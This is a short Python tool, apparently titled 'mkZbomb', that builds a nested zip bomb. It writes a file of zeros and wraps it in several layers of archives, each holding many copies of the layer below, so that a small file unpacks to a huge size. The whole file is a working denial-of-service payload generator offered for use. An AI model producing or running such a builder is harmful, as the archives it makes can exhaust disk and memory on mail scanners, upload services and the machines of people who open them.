__author__ = "Jacopo De Luca"
__version__ = "1.0.0"

import os
import argparse
import string
import random
import shutil
import zipfile
import ProgressLib

welcome = """
            _     _______                     _     
           | |   |___  / |                   | |    
  _ __ ___ | | __   / /| |__   ___  _ __ ___ | |__  
 | '_ ` _ \| |/ /  / / | '_ \ / _ \| '_ ` _ \| '_ \ 
 | | | | | |   <  / /__| |_) | (_) | | | | | | |_) |
 |_| |_| |_|_|\_\/_____|_.__/ \___/|_| |_| |_|_.__/ """

tmpDir = "tmp" + os.sep


def main():
    parser = argparse.ArgumentParser(description="Build ZipBomb.")
    parser.add_argument('name', help='Output name')
    parser.add_argument('--layer', help='Set zbomb deep', type=int, default=6)
    parser.add_argument('--cps', help='Copies for each layer', type=int, default=16)
    parser.add_argument('--size', help='Set size of \'zero\' file (Size in KB)', type=int, default=42)
    args = parser.parse_args()

    # Builder
    if not os.path.exists(tmpDir):
        print("Creating temporary working directory...")
        os.makedirs(tmpDir)

    compress = mkRndfile(args.size)
    args.layer += 1

    pbar = ProgressLib.DeterminateProgress("Computing...")
    pbar.setMax(args.layer)
    pbar.start()
    for i in range(args.layer):
        cicleName = mkRndString(6)
        for j in range(args.cps):
            zipf = zipfile.ZipFile(
                not (i == args.layer - 1) and tmpDir + cicleName + str(j) + ".zip" or args.name, "w",
                compression=zipfile.ZIP_DEFLATED)
            if i == 0:
                zipf.write(tmpDir + compress, compress)
            else:
                for k in range(args.cps):
                    _file = tmpDir + compress + str(k) + ".zip"
                    zipf.write(_file, compress + str(k) + ".zip")
                    if j == args.cps - 1 or i == args.layer - 1:
                        os.remove(_file)
            if i == args.layer - 1:
                break
            zipf.close()
        compress = cicleName
        pbar.incProgress(1)
    pbar.sync()
    return 0


def mkRndfile(size):
    filename = mkRndString(4)
    fbase = open(tmpDir + os.sep + filename, "wb")
    fbase.write(b"\0" * (size * 1024))
    fbase.close()
    return filename


def mkRndString(_len):
    _str = string.ascii_letters + string.digits
    return str().join(random.choice(_str) for _ in range(_len))


def clear():
    print("Removing temporary working directory...")
    if os.path.exists(tmpDir):
        shutil.rmtree(tmpDir)


if __name__ == "__main__":
    print("%s v%s\n\n" % (welcome, __version__))
    main()
    clear()
